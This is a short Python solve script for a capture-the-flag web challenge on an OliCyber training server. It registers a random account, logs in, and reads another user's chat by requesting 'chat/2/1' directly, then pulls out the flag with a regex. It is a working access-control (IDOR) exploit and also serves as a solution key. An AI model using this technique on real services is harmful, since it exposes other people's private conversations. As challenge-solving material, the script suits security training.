# This is an early version of our new chat service: it already 
# contains a bot that helps to remember useful things, try it out!

import requests, os, re

url = "http://connexion.challs.olicyber.it/"
username, password = os.urandom(16).hex(), os.urandom(16).hex()
regex = r"ptm{.*?}"

s = requests.Session()

# è possibile registrarsi e fare login

s.post(url + "signin", data = {
    "username": username, 
    "password": password
})
s.post(url + "login", data = {
    "username": username, 
    "password": password
})

r = s.get(url + "chat/2/1")
flag = re.findall(regex, r.text)[0]
print(f"Flag: {flag}")